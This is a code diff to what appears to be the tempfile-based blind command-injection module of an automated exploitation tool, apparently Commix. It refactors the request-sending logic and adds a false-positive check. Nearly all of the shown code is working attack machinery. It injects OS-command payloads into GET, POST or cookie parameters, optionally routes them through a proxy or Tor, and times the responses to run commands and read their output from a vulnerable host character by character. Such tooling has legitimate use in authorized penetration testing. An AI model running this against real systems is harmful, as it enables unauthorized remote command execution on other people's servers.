@@ -38,11 +38,71 @@ from src.core.injections.semiblind_based.techniques.tempfile_based import tfb_pa
  __Warning:__ This technique is still experimental, is not yet fully functional and may leads to false-positive resutls.
 """
 
+def examine_requests(payload, vuln_parameter, http_request_method, url):
+
+  start = 0
+  end = 0
+  start = time.time()
+
+  # Check if defined method is GET (Default).
+  if http_request_method == "GET":
+    
+    payload = urllib.quote(payload)
+    
+    # Check if its not specified the 'INJECT_HERE' tag
+    url = parameters.do_GET_check(url)
+    
+    target = re.sub(settings.INJECT_TAG, payload, url)
+    vuln_parameter = ''.join(vuln_parameter)
+    request = urllib2.Request(target)
+
+  # Check if defined method is POST.
+  else :
+    parameter = menu.options.data
+    parameter = urllib2.unquote(parameter)
+    
+    # Check if its not specified the 'INJECT_HERE' tag
+    parameter = parameters.do_POST_check(parameter)
+    
+    data = re.sub(settings.INJECT_TAG, payload, parameter)
+    request = urllib2.Request(url, data)
+    
+  # Check if defined extra headers.
+  headers.do_check(request)
+
+  # Check if defined any HTTP Proxy.
+  if menu.options.proxy:
+    try:
+      response = proxy.use_proxy(request)
+    except urllib2.HTTPError, err:
+      print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
+      raise SystemExit() 
+
+  # Check if defined Tor.
+  elif menu.options.tor:
+    try:
+      response = tor.use_tor(request)
+    except urllib2.HTTPError, err:
+      print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
+      raise SystemExit() 
+
+  else:
+    try:
+      response = urllib2.urlopen(request)
+    except urllib2.HTTPError, err:
+      print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
+      raise SystemExit() 
+        
+  end  = time.time()
+  how_long = int(end - start)
+
+  return how_long
+
+
 # ------------------------------------
 # Check if target host is vulnerable.
 # ------------------------------------
 def injection_test(payload, http_request_method, url):
-  
   start = 0
   end = 0
   start = time.time()
@@ -207,10 +267,11 @@ def injection(separator, maxlen, TAG, cmd, delay, http_request_method, url, vuln
   for output_length in range(int(minlen), int(maxlen)):
     
     # Execute shell commands on vulnerable host.
-    if not alter_shell :
-      payload = tfb_payloads.cmd_execution(separator, cmd, output_length, OUTPUT_TEXTFILE, delay, http_request_method)
-    else:
+    if alter_shell :
+      print output_length
       payload = tfb_payloads.cmd_execution_alter_shell(separator, cmd, output_length, OUTPUT_TEXTFILE, delay, http_request_method)
+    else:
+      payload = tfb_payloads.cmd_execution(separator, cmd, output_length, OUTPUT_TEXTFILE, delay, http_request_method)  
 
     # Check if defined "--verbose" option.
     if menu.options.verbose:
@@ -220,88 +281,7 @@ def injection(separator, maxlen, TAG, cmd, delay, http_request_method, url, vuln
       how_long = cookie_injection_test(url, vuln_parameter, payload)
 
     else:
-      start = 0
-      end = 0
-      start = time.time()
-      
-      # Check if defined method is GET (Default).
-      if http_request_method == "GET":
-        payload = urllib.quote(payload)
-        
-        # Check if its not specified the 'INJECT_HERE' tag
-        url = parameters.do_GET_check(url)
-        
-        target = re.sub(settings.INJECT_TAG, payload, url)
-        vuln_parameter = ''.join(vuln_parameter)
-        
-        #print target
-        request = urllib2.Request(target)
-    
-        # Check if defined extra headers.
-        headers.do_check(request)
-                        
-        # Check if defined any HTTP Proxy.
-        if menu.options.proxy:
-          try:
-            response = proxy.use_proxy(request)
-          except urllib2.HTTPError, err:
-            print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
-            raise SystemExit() 
-
-        # Check if defined Tor.
-        elif menu.options.tor:
-          try:
-            response = tor.use_tor(request)
-          except urllib2.HTTPError, err:
-            print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
-            raise SystemExit() 
-
-        else:
-          try:
-            response = urllib2.urlopen(request)
-          except urllib2.HTTPError, err:
-            print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
-            raise SystemExit() 
-          
-      # Check if defined method is POST.
-      else :
-        parameter = menu.options.data
-        parameter = urllib2.unquote(parameter)
-        
-        # Check if its not specified the 'INJECT_HERE' tag
-        parameter = parameters.do_POST_check(parameter)
-        
-        data = re.sub(settings.INJECT_TAG, payload, parameter)
-        request = urllib2.Request(url, data)
-        
-        # Check if defined extra headers.
-        headers.do_check(request)
-
-        # Check if defined any HTTP Proxy.
-        if menu.options.proxy:
-          try:
-            response = proxy.use_proxy(request)
-          except urllib2.HTTPError, err:
-            print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
-            raise SystemExit() 
-
-        # Check if defined Tor.
-        elif menu.options.tor:
-          try:
-            response = tor.use_tor(request)
-          except urllib2.HTTPError, err:
-            print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
-            raise SystemExit() 
-
-        else:
-          try:
-            response = urllib2.urlopen(request)
-          except urllib2.HTTPError, err:
-            print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
-            raise SystemExit() 
-          
-      end  = time.time()
-      how_long = int(end - start)
+      how_long = examine_requests(payload, vuln_parameter, http_request_method, url)
     
     if how_long >= delay:
       if menu.options.verbose:
@@ -329,11 +309,11 @@ def injection(separator, maxlen, TAG, cmd, delay, http_request_method, url, vuln
       for ascii_char in range(32, 129):
         
         # Get the execution ouput, of shell execution.
-        if not alter_shell :
-          payload = tfb_payloads.get_char(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, delay, http_request_method)
-        else:
+        if alter_shell :
           payload = tfb_payloads.get_char_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, delay, http_request_method)
-          
+        else:
+          payload = tfb_payloads.get_char(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, delay, http_request_method)
+
         # Check if defined "--verbose" option.
         if menu.options.verbose:
           sys.stdout.write("\n" + Fore.GREY + payload.replace("\n", "\\n") + Style.RESET_ALL)
@@ -342,75 +322,7 @@ def injection(separator, maxlen, TAG, cmd, delay, http_request_method, url, vuln
           how_long = cookie_injection_test(url, vuln_parameter, payload)
           
         else:
-          start = 0
-          end = 0
-          start = time.time()
-          
-          if http_request_method == "GET":
-            payload = urllib.quote(payload)
-            target = re.sub(settings.INJECT_TAG, payload, url)
-            vuln_parameter = ''.join(vuln_parameter)
-            request = urllib2.Request(target)
-            
-            # Check if defined extra headers.
-            headers.do_check(request)
-              
-            # Check if defined any HTTP Proxy.
-            if menu.options.proxy:
-              try:
-                response = proxy.use_proxy(request)
-              except urllib2.HTTPError, err:
-                print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
-                raise SystemExit() 
-
-            # Check if defined Tor.
-            elif menu.options.tor:
-              try:
-                response = tor.use_tor(request)
-              except urllib2.HTTPError, err:
-                print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
-                raise SystemExit() 
-
-            else:
-              try:
-                response = urllib2.urlopen(request)
-              except urllib2.HTTPError, err:
-                print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
-                raise SystemExit() 
-              
-          else :
-            parameter = urllib2.unquote(parameter)
-            data = re.sub(settings.INJECT_TAG, payload, parameter)
-            request = urllib2.Request(url, data)
-            
-            # Check if defined extra headers.
-            headers.do_check(request)
-              
-            # Check if defined any HTTP Proxy.
-            if menu.options.proxy:
-              try:
-                response = proxy.use_proxy(request)
-              except urllib2.HTTPError, err:
-                print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
-                raise SystemExit() 
-
-            # Check if defined Tor.
-            elif menu.options.tor:
-              try:
-                response = tor.use_tor(request)
-              except urllib2.HTTPError, err:
-                print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
-                raise SystemExit() 
-
-            else:
-              try:
-                response = urllib2.urlopen(request)
-              except urllib2.HTTPError, err:
-                print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
-                raise SystemExit() 
-              
-          end  = time.time()
-          how_long = int(end - start)
+          how_long = examine_requests(payload, vuln_parameter, http_request_method, url)
 
         if how_long >= delay:
           if not menu.options.verbose:
@@ -434,5 +346,72 @@ def injection(separator, maxlen, TAG, cmd, delay, http_request_method, url, vuln
     output = ""
 
   return  check_how_long, output
+
+
+# -------------------------------------
+# False Positive check and evaluation.
+# -------------------------------------
+def false_positive_check(separator, TAG, cmd, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, randvcalc, alter_shell):
+  
+  found_chars = False
+
+  for output_length in range(1, 3):
+    
+    # Execute shell commands on vulnerable host.
+    if alter_shell :
+      payload = tfb_payloads.cmd_execution_alter_shell(separator, cmd, output_length, OUTPUT_TEXTFILE, delay, http_request_method)
+    else:
+      payload = tfb_payloads.cmd_execution(separator, cmd, output_length, OUTPUT_TEXTFILE, delay, http_request_method)
+
+    # Check if defined "--verbose" option.
+    if menu.options.verbose:
+      sys.stdout.write("\n" + Fore.GREY + payload.replace("\n", "\\n") + Style.RESET_ALL)
+
+    if menu.options.cookie and settings.INJECT_TAG in menu.options.cookie:
+      how_long = cookie_injection_test(url, vuln_parameter, payload)
+    else:
+      how_long = examine_requests(payload, vuln_parameter, http_request_method, url)
+
+    if how_long >= delay:
+      found_chars = True
+      break
+
+  if found_chars == True :
+    num_of_chars = output_length + 1
+    check_start = 0
+    check_end = 0
+    check_start = time.time()
+    
+    output = [] 
+    percent = 0
+
+    for num_of_chars in range(1, int(num_of_chars)):
+      for ascii_char in range(1, 3):
+ 
+        # Get the execution ouput, of shell execution.
+        if alter_shell:
+          payload = tfb_payloads.fp_result_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, delay, http_request_method)
+        else:
+          payload = tfb_payloads.fp_result(separator, OUTPUT_TEXTFILE, ascii_char, delay, http_request_method)
+          
+        # Check if defined "--verbose" option.
+        if menu.options.verbose:
+          sys.stdout.write("\n" + Fore.GREY + payload.replace("\n", "\\n") + Style.RESET_ALL)
+
+        if menu.options.cookie and settings.INJECT_TAG in menu.options.cookie:
+          how_long = cookie_injection_test(url, vuln_parameter, payload)
+        else:
+          how_long = examine_requests(payload, vuln_parameter, http_request_method, url)
+
+        if how_long >= delay:
+          output.append(ascii_char)
+          break
+
+    check_end  = time.time()
+    check_how_long = int(check_end - check_start)
+    output = "".join(str(p) for p in output)
+
+    if str(output) == str(randvcalc):
+      return output
 
 #eof
